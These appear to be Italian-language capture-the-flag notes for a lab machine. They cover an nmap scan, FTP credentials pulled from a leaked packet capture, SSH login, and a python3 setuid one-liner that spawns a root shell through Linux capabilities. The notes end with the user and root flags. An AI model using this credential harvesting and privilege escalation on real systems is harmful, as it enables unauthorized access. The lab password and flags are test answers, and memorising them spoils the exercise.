IP: 10.10.10.245

....
Porte aperte:
sudo nmap -sC -sV -A 10.10.10.245 -oN namp_scan_1

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn

--> Vedo web server sulla porta 80, mi connetto dal browser
--> Vedo ssh su porta 22
....

User: Nathan

--> Vedo sotto link "Security Snapshot (5 Second PCAP + Analysis)" una pagina che riporta dei pacchetti, tramite url passo a /data/0
--> scarico il file e lo apro con wireshark

sotto ftp trovo le seguenti informazioni

	4.126500	192.168.196.1	192.168.196.16	FTP	69	Request: USER nathan
	4.126630	192.168.196.16	192.168.196.1	FTP	90	Response: 331 Please specify the password.
	5.424998	192.168.196.1	192.168.196.16	FTP	78	Request: PASS Buck3tH4TF0RM3!
	5.432387	192.168.196.16	192.168.196.1	FTP	79	Response: 230 Login successful.

User: nathan
Password: Buck3tH4TF0RM3!
....

....
provo a connetermi con ssh

ssh nathan@10.10.10.245

cat user.txt

User flag: 9c17c51b6efb20a449501f84d6abdbc4

....

Linux priv escalation using capabilities

Detection:
getcap -r / 2>/dev/null

python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

--> ottenuti i privilegi vado nella cartella /root

cd /root
cat root.txt

Root: 75def9d5afbf8b7c2c1af1c7112bcfa7

....
